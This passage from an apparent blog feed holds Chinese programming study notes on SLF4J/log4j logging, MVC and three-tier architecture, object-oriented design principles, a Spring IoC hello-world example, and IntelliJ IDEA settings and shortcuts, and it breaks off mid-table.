附加器，采用匹配器布局模式</li><li><code>log4j.appender.A3.MaxFileSize</code>：日志文件最大值</li><li><code>log4j.appender.A3.MaxBackupIndex</code>：最多纪录文件数</li><li><code>log4j.appender.file.layout.ConversionPattern</code>：file 附加器，日志输出格式为：日期 日志级别 [类名] - 消息<code>换行符</code><h1 id="测试日志输出"><a href="#测试日志输出" class="headerlink" title="测试日志输出"></a>测试日志输出</h1>创建一个测试类，并测试日志输出效果，代码如下：<pre><code>package com.funtl.hello.spring;</code></pre></li></ul><p>import org.slf4j.Logger;<br>import org.slf4j.LoggerFactory;</p><p>public class MyTest {</p><pre><code>public static final Logger logger = LoggerFactory.getLogger(MyTest.class);public static void main(String[] args) {    logger.info(&quot;slf4j for info&quot;);    logger.debug(&quot;slf4j for debug&quot;);    logger.error(&quot;slf4j for error&quot;);    logger.warn(&quot;slf4j for warn&quot;);    String message = &quot;Hello SLF4J&quot;;    logger.info(&quot;slf4j message is : {}&quot;, message);}</code></pre><p>}</p><pre><code>此时控制台显示为：</code></pre><p>2018-06-07 05:15:42,914 INFO [com.funtl.hello.spring.MyTest] - slf4j for info<br>2018-06-07 05:15:42,915 ERROR [com.funtl.hello.spring.MyTest] - slf4j for error<br>2018-06-07 05:15:42,915 WARN [com.funtl.hello.spring.MyTest] - slf4j for warn<br>2018-06-07 05:15:42,916 INFO [com.funtl.hello.spring.MyTest] - slf4j message is : Hello SLF4J<br>```<br>项目根目录下也会多出 <code>logs/log.log</code> 目录及文件</p><h1 id="附：占位符说明"><a href="#附：占位符说明" class="headerlink" title="附：占位符说明"></a>附：占位符说明</h1><p>打日志的时候使用了<code>{}</code> 占位符，这样就不会有字符串拼接操作，减少了无用 <code>String</code> 对象的数量，节省了内存。并且，记住，在生产最终日志信息的字符串之前，这个方法会检查一个特定的日志级别是不是打开了，这不仅降低了内存消耗而且预先降低了<code>CPU</code> 去处理字符串连接命令的时间。</p>]]></content>
      
      
      <categories>
          
          <category> log4j </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> log4j </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高内聚低耦合</title>
      <link href="2018/06/01/gao-nei-ju-di-ou-he/"/>
      <url>2018/06/01/gao-nei-ju-di-ou-he/</url>
      
        <content type="html"><![CDATA[<p>随笔：<br>视图层<br>业务逻辑层 service<br>数据访问层 Dao 数据访问对象（持久层）</p><p>在开发中，业务才是核心</p><p>新的技术诞生都是为了提高产品的</p><ul><li>效率</li><li>安全性</li><li>易于维护，使用</li></ul><blockquote><p>总结：技术是辅助业务的</p></blockquote><p>业务问题</p><p>业务是有复杂度的，事务</p><p>又分为：</p><ul><li>简单业务  开启一个事务</li><li>普通业务  开启三个事务</li><li>复杂业务  开启七个事务</li></ul><p>多张表之间有依赖关系   –&gt; 强关联性</p><p>所有业务都写进main方法那么这个就是      <code>高耦合</code></p><p>方法技巧：</p><ul><li>一个类只做一件事</li><li>一个方法只做一件事</li><li>写且只写一次<ul><li>例如：工具类–&gt;日期管理–&gt;依赖专门负责日期运算方法</li><li>例如：数学工具类<br>日期也有加减  四则运算<br>（当日期类依赖了数学类就是强相关的，耦合就产生了）<blockquote><p>按照以上三个步骤就可以实现<code>高内聚，低耦合</code></p></blockquote></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是MVC模式</title>
      <link href="2018/05/16/shi-me-shi-mvc-mo-shi/"/>
      <url>2018/05/16/shi-me-shi-mvc-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>MVC，即 Model 模型、View 视图，及 Controller 控制器。</p><ul><li>View：视图，为用户提供使用界面，与用户直接进行交互。</li><li>Model：模型，承载数据，并对用户提交请求进行计算的模块。其分为两类，一类称为数据承载 Bean，一类称为业务处理 Bean。所谓数据承载 Bean 是指实体类，专门用户承载业务数据的，如 Student、User 等。而业务处理 Bean 则是指 Service 或 Dao 对象， 专门用于处理用户提交请求的。</li><li>Controller：控制器，用于将用户请求转发给相应的 Model 进行处理，并根据 Model 的计算结果向用户提供相应响应。<h1 id="MVC-架构程序的工作流程"><a href="#MVC-架构程序的工作流程" class="headerlink" title="MVC 架构程序的工作流程"></a>MVC 架构程序的工作流程</h1></li><li>用户通过 View 页面向服务端提出请求，可以是表单请求、超链接请求、AJAX 请求等</li><li>服务端 Controller 控制器接收到请求后对请求进行解析，找到相应的 Model 对用户请求进行处理</li><li>Model 处理后，将处理结果再交给 Controller</li><li>Controller 在接到处理结果后，根据处理结果找到要作为向客户端发回的响应 View 页面。页面经渲染（数据填充）后，再发送给客户端。</li></ul><p><img src="https://funtl.com/assets/Lusifer2018060421090002.png" alt></p><h1 id="三层架构-MVC-示意图"><a href="#三层架构-MVC-示意图" class="headerlink" title="三层架构 + MVC 示意图"></a>三层架构 + MVC 示意图</h1><p><img src="https://funtl.com/assets/Lusifer2018060421090003.png" alt></p><p>PS : <code>MVC模式</code>是三层架构的<code>视图层</code></p><p>说说你对设计原则的理解</p><p>口诀</p><p>为了便于记忆,我们可以使用一一个几决来记忆面向对象设计原则:开口合里最单依</p><p>开:开闭原则<br>口:接口隔离原则<br>合:组合/聚合原则<br>里:里式替换原则<br>最:最少知识原则(迪米特法则)<br>单:单一职责原则<br>依:依赖倒置原则<br>开闭原则(Open-Closed Principle, 0CP)</p><p>一个软件实体应当刘扩展开发，对修改关闭说的是，再设计一个模块的时候,应当使这个模块可以在不被修改的前提下被扩展换言之，应当可以在不必修改源代码的情况下改变这个模块的行为,在保持系统定稳定性的基础F ,对系统进行扩展。这是面向对象设计( 0OD )的基石，也是最重要的原则。</p><p>接口隔离原则(Interface Segregation Principle, ISP)</p><p>一个类对另外一个类的依赖是建立在最小的接山上。</p><p>使用多个专J的接口比使用单-的总接C要好根据客户需要的不同，而为不同的客户端提供不同的服务是一 种应当得到鼓励的做法。就像”看人下菜碟”一 -样要看客人是谁，再提供不同档次的饭菜.</p><p>胖接口会导致他们的客户程序之间产生不正常的并且有害的耦合关系当一个客户程序要求该胖接口进行-一个改动时,会影响到所有其他的客户程序,因此客户程序应该仅仅依赖他们实际需要调用的方法.</p><p>组合/聚合复用原则(Composite/Aggregate Reuse Principle , CARP)</p><p>在一个新的对象里面使用一些已有的对象,使之成为新对象的一部分;新的对象通过这些向对象的委派达到复用已有功能的目的.这个设计原则有另一个简短的表述:要尽量使用合成/聚合,尽量不要使用继承.</p><p>里氏代换原则(Liskov Substitution Principle，LSP)</p><h1 id="说说你对设计原则的理解"><a href="#说说你对设计原则的理解" class="headerlink" title="说说你对设计原则的理解"></a>说说你对设计原则的理解</h1><h3 id="口诀"><a href="#口诀" class="headerlink" title="口诀"></a>口诀</h3><p>为了便于记忆,我们可以使用一一个几决来记忆面向对象设计原则:开口合里最单依</p><ul><li>开:开闭原则</li><li>口:接口隔离原则</li><li>合:组合/聚合原则</li><li>里:里式替换原则</li><li>最:最少知识原则(迪米特法则)</li><li>单:单一职责原则</li><li>依:依赖倒置原则</li></ul><h3 id="开闭原则-Open-Closed-Principle-0CP"><a href="#开闭原则-Open-Closed-Principle-0CP" class="headerlink" title="开闭原则(Open-Closed Principle, 0CP)"></a>开闭原则(Open-Closed Principle, 0CP)</h3><p>一个软件实体应当刘扩展开发，对修改关闭说的是，再设计一个模块的时候,应当使这个模块可以在不被修改的前提下被扩展换言之，应当可以在不必修改源代码的情况下改变这个模块的行为,在保持系统定稳定性的基础F ,对系统进行扩展。这是面向对象设计( 0OD )的基石，也是最重要的原则。</p><h3 id="接口隔离原则-Interface-Segregation-Principle-ISP"><a href="#接口隔离原则-Interface-Segregation-Principle-ISP" class="headerlink" title="接口隔离原则(Interface Segregation Principle, ISP)"></a>接口隔离原则(Interface Segregation Principle, ISP)</h3><ul><li><p>一个类对另外一个类的依赖是建立在最小的接山上。</p></li><li><p>使用多个专J的接口比使用单-的总接C要好根据客户需要的不同，而为不同的客户端提供不同的服务是一 种应当得到鼓励的做法。就像”看人下菜碟”一 -样要看客人是谁，再提供不同档次的饭菜.</p></li><li><p>胖接口会导致他们的客户程序之间产生不正常的并且有害的耦合关系当一个客户程序要求该胖接口进行-一个改动时,会影响到所有其他的客户程序,因此客户程序应该仅仅依赖他们实际需要调用的方法.</p></li></ul><h3 id="组合-聚合复用原则-Composite-Aggregate-Reuse-Principle-CARP"><a href="#组合-聚合复用原则-Composite-Aggregate-Reuse-Principle-CARP" class="headerlink" title="组合/聚合复用原则(Composite/Aggregate Reuse Principle , CARP)"></a>组合/聚合复用原则(Composite/Aggregate Reuse Principle , CARP)</h3><p>在一个新的对象里面使用一些已有的对象,使之成为新对象的一部分;新的对象通过这些向对象的委派达到复用已有功能的目的.这个设计原则有另一个简短的表述:要尽量使用合成/聚合,尽量不要使用继承.</p><h3 id="里氏代换原则-Liskov-Substitution-Principle，LSP"><a href="#里氏代换原则-Liskov-Substitution-Principle，LSP" class="headerlink" title="里氏代换原则(Liskov Substitution Principle，LSP)"></a>里氏代换原则(Liskov Substitution Principle，LSP)</h3><p>由 Barbar Liskov (芭芭拉.里氏) 提出，是继承复用的基石。</p><p>所有引用基类的地方必须透明的使用其子类的对象。只要父类能出现的地方子类也可以出现，而且替换为子类不会产生任何错误或异常，但是反过来就不行，有子类出现的地方，父类未必就能适应。</p><h3 id="最少知识原则-Least-Knowledge-Principle，LKP"><a href="#最少知识原则-Least-Knowledge-Principle，LKP" class="headerlink" title="最少知识原则(Least Knowledge Principle，LKP)"></a>最少知识原则(Least Knowledge Principle，LKP)</h3><p>一个对象应当对其他对象有尽可能少的了解.</p><p>没有任何一个其他的 OO 设计原则象迪米特法则这样有如此之多的表述方式,如下几种：</p><ul><li>只与你直接的朋友们通信(Only talk to your immediate friends)</li><li>不要跟”陌生人”说话(Don’t talk to strangers)</li><li>每一个软件单位对其他的单位都只有最少的知识,而且局限于那些本单位密切相关的软件单位</li></ul><p>就是说,如果两个类不必彼此直接通信,那么这两个类就不应当发生直接的相互作用,如果其中的一个类需要调用另一个类的某一个方法的话,可以通过第三者转发这个调用。</p><h3 id="单一职责原则-Simple-responsibility-pinciple，SRP"><a href="#单一职责原则-Simple-responsibility-pinciple，SRP" class="headerlink" title="单一职责原则(Simple responsibility pinciple，SRP)"></a>单一职责原则(Simple responsibility pinciple，SRP)</h3><p>就一个类而言,应该仅有一个引起它变化的原因,如果你能想到多于一个的动机去改变一个类,那么这个类就具有多于一个的职责.应该把多于的指责分离出去,分别再创建一些类来完成每一个职责.</p><h3 id="依赖倒置原则-Dependence-Inversion-Principle"><a href="#依赖倒置原则-Dependence-Inversion-Principle" class="headerlink" title="依赖倒置原则(Dependence Inversion Principle)"></a>依赖倒置原则(Dependence Inversion Principle)</h3><p>要求客户端依赖于抽象耦合.</p><ul><li>模块间的依赖通过抽象发生，实现类之间不发生直接的依赖关系，其依赖关系是通过- 接口或抽象类产生的。</li><li>接口或抽象类不依赖实现类</li><li>实现类依赖接口或抽象类</li></ul><p>采用依赖倒置原则可以减少类间的耦合性，提高系统的稳定，降低并行开发引起的风险，提高代码的可读性和可维护性。</p>]]></content>
      
      
      <categories>
          
          <category> MVC模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> MVC模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是三层架构</title>
      <link href="2018/05/11/shi-me-shi-san-ceng-jia-gou/"/>
      <url>2018/05/11/shi-me-shi-san-ceng-jia-gou/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是系统架构"><a href="#什么是系统架构" class="headerlink" title="什么是系统架构"></a>什么是系统架构</h1><p>所谓系统架构是指，整合应用系统程序大的结构。经常提到的系统结构有两种：三层架构与 MVC。这两种结构既有区别，又有联系。但这两种结构的使用，均是为了降低系统模块间的耦合度。</p><h1 id="什么是三层架构"><a href="#什么是三层架构" class="headerlink" title="什么是三层架构"></a>什么是三层架构</h1><p>三层架构是指：视图层 View、服务层 Service，与持久层 DAO。它们分别完成不同的功能。</p><ul><li>View 层：用于接收用户提交请求的代码</li><li>Service 层：系统的业务逻辑主要在这里完成</li><li>DAO 层：直接操作数据库的代码<br>为了更好的降低各层间的耦合度，在三层架构程序设计中，采用面向抽象编程。即上层对下层的调用，是通过接口实现的。而下层对上层的真正服务提供者，是下层接口的实现类。服务标准（接口）是相同的，服务提供者（实现类）可以更换。这就实现了层间解耦合。</li></ul><p><img src="https://funtl.com/assets/Lusifer2018060421090001.png" alt></p><h1 id="为什么需要架构"><a href="#为什么需要架构" class="headerlink" title="为什么需要架构"></a>为什么需要架构</h1><p>随着系统的升级，业务结构就越来复杂，越复杂的系统它的耦合度就越高，所以就需要架构进行解耦合。<br><img src="https://funtl.com/assets/Lusifer2018060421090001.png" alt></p><h1 id="随笔："><a href="#随笔：" class="headerlink" title="随笔："></a>随笔：</h1><p>视图层</p><p>业务逻辑层 service</p><p>数据访问层 Dao 数据访问对象（持久层）</p><h1 id="在开发中，业务才是核心"><a href="#在开发中，业务才是核心" class="headerlink" title="在开发中，业务才是核心"></a>在开发中，业务才是核心</h1><p>新的技术诞生都是为了提高产品的</p><ul><li>效率</li><li>安全性</li><li>易于维护，使用</li></ul><blockquote><p>总结：技术是辅助业务的</p></blockquote><p><strong>业务问题</strong></p><p>业务是有复杂度的，事务</p><p>又分为：</p><ul><li>简单业务  开启一个事务</li><li>普通业务  开启三个事务</li><li>复杂业务  开启七个事务</li></ul><p>多张表之间有依赖关系   –&gt; 强关联性</p><p>所有业务都写进main方法那么这个就是      <code>高耦合</code></p><p>方法技巧：</p><ul><li>一个类只做一件事</li><li>一个方法只做一件事</li><li>写且只写一次<ul><li>例如：工具类–&gt;日期管理–&gt;依赖专门负责日期运算方法</li><li>例如：数学工具类<br>日期也有加减  四则运算<br>（当日期类依赖了数学类就是强相关的，耦合就产生了）<blockquote><p>按照以上三个步骤就可以实现<code>高内聚，低耦合</code></p></blockquote></li></ul></li></ul><h1 id="Model-角色"><a href="#Model-角色" class="headerlink" title="Model              角色"></a>Model              角色</h1><p>数据模型  Entity     JSP</p><p>业务模型  Service   </p><p>控制器 Controller  处理用户的请求</p><p>Servlet 服务器的小程序</p><ul><li>处理业务逻辑</li><li>处理页面展示</li></ul><p>JSP就是Servlet 处理页面展示的技术  .asp  .jsp  .php</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring框架</title>
      <link href="2018/05/05/spring-kuang-jia/"/>
      <url>2018/05/05/spring-kuang-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Spring 的主要作用就是为代码“解耦”，降低代码间的耦合度。</p><p>根据功能的不同，可以将一个系统中的代码分为 <strong>主业务逻辑</strong> 与 <strong>系统级业务逻辑</strong> 两类。它们各自具有鲜明的特点：主业务代码间逻辑联系紧密，有具体的专业业务应用场景，复用性相对较低；系统级业务相对功能独立，没有具体的专业业务应用场景，主要是为主业务提供系统级服务，如日志、安全、事务等，复用性强。</p><p>Spring 根据代码的功能特点，将降低耦合度的方式分为了两类：IoC 与 AOP。IoC 使得主业务在相互调用过程中，不用再自己维护关系了，即不用再自己创建要使用的对象了。而是由 Spring 容器统一管理，自动“注入”。而 AOP 使得系统级服务得到了最大复用，且不用再由程序员手工将系统级服务“混杂”到主业务逻辑中了，而是由 Spring 容器统一完成“织入”。</p><p>Spring 是于 2003 年兴起的一个轻量级的 Java 开发框架，它是为了解决企业应用开发的复杂性而创建的。Spring 的核心是控制反转（IoC）和面向切面编程（AOP）。简单来说，Spring 是一个分层的 Java SE/EE full-stack(一站式)轻量级开源框架。</p><h1 id="Spring-体系结构"><a href="#Spring-体系结构" class="headerlink" title="Spring 体系结构"></a>Spring 体系结构</h1><p><img src="https://funtl.com/assets/spring-overview.png" alt></p><p>Spring 由 20 多个模块组成，它们可以分为数据访问/集成（Data Access/Integration）、Web、面向切面编程（AOP, Aspects）、应用服务器设备管理（Instrumentation）、消息发送（Messaging）、核心容器（Core Container）和测试（Test）。</p><h1 id="Spring-的特点"><a href="#Spring-的特点" class="headerlink" title="Spring 的特点"></a>Spring 的特点</h1><h3 id="非侵入式"><a href="#非侵入式" class="headerlink" title="非侵入式"></a>非侵入式</h3><p>所谓非侵入式是指，Spring 框架的 API 不会在业务逻辑上出现，即业务逻辑是 POJO。由于业务逻辑中没有 Spring 的 API，所以业务逻辑可以从 Spring 框架快速的移植到其他框架， 即与环境无关。</p><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>Spring 作为一个容器，可以管理对象的生命周期、对象与对象之间的依赖关系。可以通过配置文件，来定义对象，以及设置与其他对象的依赖关系。</p><h3 id="IoC"><a href="#IoC" class="headerlink" title="IoC"></a>IoC</h3><p>控制反转（Inversion of Control），即创建被调用者的实例不是由调用者完成，而是由 Spring 容器完成，并注入调用者。</p><p>当应用了 IoC，一个对象依赖的其它对象会通过被动的方式传递进来，而不是这个对象自己创建或者查找依赖对象。即，不是对象从容器中查找依赖，而是容器在对象初始化时不等对象请求就主动将依赖传递给它。</p><h3 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h3><p>面向切面编程（AOP，Aspect Orient Programming），是一种编程思想，是面向对象编程 OOP 的补充。很多框架都实现了对 AOP 编程思想的实现。Spring 也提供了面向切面编程的丰富支持，允许通过分离应用的业务逻辑与系统级服务（例如日志和事务管理）进行开发。应用对象只实现它们应该做的——完成业务逻辑——仅此而已。它们并不负责其它的系统级关注点，例如日志或事务支持。</p><p>我们可以把日志、安全、事务管理等服务理解成一个“切面”，那么以前这些服务一直是直接写在业务逻辑的代码当中的，这有两点不好：首先业务逻辑不纯净；其次这些服务被很多业务逻辑反复使用，完全可以剥离出来做到复用。那么 AOP 就是这些问题的解决方案， 可以把这些服务剥离出来形成一个“切面”，以期复用，然后将“切面”动态的“织入”到业务逻辑中，让业务逻辑能够享受到此“切面”的服务。</p><h1 id="Spring-与-IoC"><a href="#Spring-与-IoC" class="headerlink" title="Spring 与 IoC"></a>Spring 与 IoC</h1><p>控制反转（IoC，Inversion of Control），是一个概念，是一种思想。指将传统上由程序代码直接操控的对象调用权交给容器，通过容器来实现对象的装配和管理。控制反转就是对对象控制权的转移，从程序代码本身反转到了外部容器。</p><p>IoC 是一个概念，是一种思想，其实现方式多种多样。当前比较流行的实现方式有两种： 依赖注入和依赖查找。依赖注入方式应用更为广泛。</p><ul><li>依赖查找：Dependency Lookup，DL，容器提供回调接口和上下文环境给组件，程序代码则需要提供具体的查找方式。比较典型的是依赖于 JNDI 系统的查找。</li><li><strong>依赖注入：</strong>Dependency Injection，DI，程序代码不做定位查询，这些工作由容器自行完成。<br>依赖注入 DI 是指程序运行过程中，若需要调用另一个对象协助时，无须在代码中创建被调用者，而是依赖于外部容器，由外部容器创建后传递给程序。</li></ul><p>Spring 的依赖注入对调用者与被调用者几乎没有任何要求，完全支持 POJO 之间依赖关系的管理。</p><p><strong>依赖注入是目前最优秀的解耦方式</strong>。依赖注入让 Spring 的 Bean 之间以配置文件的方式组织在一起，而不是以硬编码的方式耦合在一起的。</p><h1 id="POM"><a href="#POM" class="headerlink" title="POM"></a>POM</h1><p>创建一个工程名为 hello-spring 的项目，pom.xml 文件如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;com.lele&lt;/groupId&gt;    &lt;artifactId&gt;hello-spring&lt;/artifactId&gt;    &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;    &lt;packaging&gt;jar&lt;/packaging&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;            &lt;version&gt;4.3.17.RELEASE&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;</code></pre><p>主要增加了 org.springframework:spring-context 依赖</p><h1 id="创建接口与实现"><a href="#创建接口与实现" class="headerlink" title="创建接口与实现"></a>创建接口与实现</h1><h3 id="创建-UserService-接口"><a href="#创建-UserService-接口" class="headerlink" title="创建 UserService 接口"></a>创建 <code>UserService</code> 接口</h3><pre><code>package com.lele.hello.spring.service;public interface UserService {    public void sayHi();}</code></pre><h3 id="创建-UserServiceImpl-实现"><a href="#创建-UserServiceImpl-实现" class="headerlink" title="创建 UserServiceImpl 实现"></a>创建 UserServiceImpl 实现</h3><pre><code>package com.lele.hello.spring.service.impl;import com.lele.hello.spring.service.UserService;public class UserServiceImpl implements UserService {    public void sayHi() {        System.out.println(&quot;Hello Spring&quot;);    }}</code></pre><h1 id="创建-Spring-配置文件"><a href="#创建-Spring-配置文件" class="headerlink" title="创建 Spring 配置文件"></a>创建 Spring 配置文件</h1><p>在 <code>src/main/resources</code> 目录下创建 <code>spring-context.xml</code> 配置文件，从现在开始类的实例化工作交给 Spring 容器管理（IoC），配置文件如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;userService&quot; class=&quot;com.lele.hello.spring.service.impl.UserServiceImpl&quot; /&gt;&lt;/beans&gt;</code></pre><ul><li><p><bean>：用于定义一个实例对象。一个实例对应一个 bean 元素。</bean></p></li><li><p>id：该属性是 Bean 实例的唯一标识，程序通过 id 属性访问 Bean，Bean 与 Bean 间的依赖关系也是通过 id 属性关联的。</p></li><li><p>class：指定该 Bean 所属的类，注意这里只能是类，不能是接口。</p></li></ul><h1 id="测试-Spring-IoC"><a href="#测试-Spring-IoC" class="headerlink" title="测试 Spring IoC"></a>测试 Spring IoC</h1><p>创建一个 MyTest 测试类，测试对象是否能够通过 Spring 来创建，代码如下：</p><pre><code>package com.lele.hello.spring;import com.lele.hello.spring.service.UserService;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MyTest {    public static void main(String[] args) {        // 获取 Spring 容器        ApplicationContext applicationContext = new ClassPathXmlApplicationContext(&quot;spring-context.xml&quot;);        // 从 Spring 容器中获取对象        UserService userService = (UserService) applicationContext.getBean(&quot;userService&quot;);        userService.sayHi();    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于intelij IDEA2019.2的使用教程</title>
      <link href="2018/05/02/guan-yu-intelij-idea2019-2-de-shi-yong-jiao-cheng/"/>
      <url>2018/05/02/guan-yu-intelij-idea2019-2-de-shi-yong-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>工欲善其事<br>必先利其器</p></blockquote><p>同时，在这次分享之后，本人自己也学习到了一些新的使用技巧，所以借着这次机会，一起分享出来。希望可以帮到一些人，不能浪费IDEA这个优秀的IDE呀。</p><blockquote><p>基于的 IDEA 版本信息：IntelliJ IDEA 2019.2版本</p></blockquote><h2 id="知识点概览："><a href="#知识点概览：" class="headerlink" title="知识点概览："></a>知识点概览：</h2><ul><li><p>高效率配置</p></li><li><p>日常使用 必备快捷键（★★）</p></li></ul><pre><code>- 查找- 跳转切换- 编码相关- 代码阅读相关- 版本管理相关</code></pre><ul><li><p>编码效率相关（★★）</p><ul><li><p>文件代码模板</p></li><li><p>实时代码模板</p></li><li><p>其他</p></li></ul></li><li><p>代码调试 源码阅读相关（★★★）</p><ul><li><p>视图模式</p></li><li><p>代码调试</p></li><li><p>…</p></li></ul></li><li><p>插件方面</p><ul><li><p>插件的安装与使用</p></li><li><p>插件推荐</p></li></ul></li><li><p>参考</p><hr><h2 id="标题高效率配置"><a href="#标题高效率配置" class="headerlink" title="标题高效率配置"></a>标题高效率配置</h2><ol><li>代码提示不区分大小写</li></ol><p>Settings -&gt; Editor -&gt; General -&gt; Code Completion<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNPaWJub0V0dVNpYVVhRjdjblRyanFjbWlhZHBEdHJwcXEwYlV1SHNvMUx5WlZJbElCMUwyeEJwckEvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>(低版本 将 Case sensitive completion 设置为 None 就可以了)</p></li></ul><ol start="2"><li>自动导包功能及相关优化功能</li></ol><p>Settings -&gt; Editor -&gt; General -&gt; Auto Import<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNuYmg2bjVSOTF2eUI3a05XZkZyd2tQNDJhQm1GcFdvRWQ1dnp2OGlia1I0WHZDbTFOQ1lUNUhnLzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><ol start="3"><li>CTRL + 滑动滚轮 调整窗口显示大小</li></ol><p>Settings -&gt; Editor -&gt; General -&gt; Change font size (Zoom) with Ctrl+Mouse wheel</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNMNWJRVkZtRzl0RG9vU3hSY3ppYnpveU5PZWtNTHhWTFg3RHFYRGYzeXR2SlVsWGZMaWFuaWJOeEEvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><p>选择之后，就可以通过CTRL+滑动滚轮的方式，调整编辑器窗口的字体大小</p><p>4.tab 多行显示</p><p>这点因人而异，有些人喜欢直接取消所有tab，改用快捷键的方式，我屏幕比较大，所以喜欢把tab全部显示出来。</p><p>Window -&gt; Editor Tabs -&gt; Tabs Placement，取消勾选 Show Tabs In Single Row选项。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnN3VWNBemxpY016NGVpY2s1YW9ZUGtjcVRWcWVqbjQzZDM0NmpraWI3UkZ3VXBINlYySzcxRGdGQWcvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>效果如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy96Nzl5SWJHQkVRQnNBZmo2WU9JMlNqdExKZHQzMnBkMzZqQUNMWGd0ODdoc0Zzd2liOURFaWNqanlJODFlOFRzYkF0djVpY3B4aWJkdEF0MlJyN0ZOTlhpYVFBLzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><ol start="5"><li>代码编辑区显示行号<br>Settings -&gt; Editor -&gt; General -&gt; Appearance 勾选 Show Line Numbers</li></ol><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnM5cmJ1NUpIREtVM1RJcjZmWFVFVEw0aWNUR0NpYzBOZW9zRFRubVlPakpxdld4N1FpYkt1Nm5PSkEvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNob2FRSGJWcnlHTmdSS2Z3VW9BejZWaWJ0S0dxSlBZUmoxVE1tTTdMa3VPRTFUMTg1bEw4a0R3LzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><hr><h2 id="日常使用-必备快捷键（★★）"><a href="#日常使用-必备快捷键（★★）" class="headerlink" title="日常使用 必备快捷键（★★）"></a>日常使用 必备快捷键（★★）</h2><p>查找<br>| 快捷键                       | 介绍                |<br>|—————————|——————-|<br>| Ctrl + F                 | 在当前文件进行文本查找       |<br>| Ctrl + R                 | 在当前文件进行文本替换       |<br>| Shift + Ctrl + F        | 在项目进行文本查找         |<br>| Shift + Ctrl + R        | 在项目进行文本替换         |<br>| Shift  + Shift           | 快速搜索              |<br>| Ctrl + N                 | 查找class           |<br>| Ctrl + Shift + N        | 查找文件              |<br>| Ctrl + Shift + Alt + N | 查找symbol（查找某个方法名） |</p><p>跳转切换</p><table><thead><tr><th>快捷键</th><th>介绍</th></tr></thead><tbody><tr><td>Ctrl + E</td><td>最近文件</td></tr><tr><td>Ctrl + Tab</td><td>切换文件</td></tr><tr><td>Ctrl  + Alt + 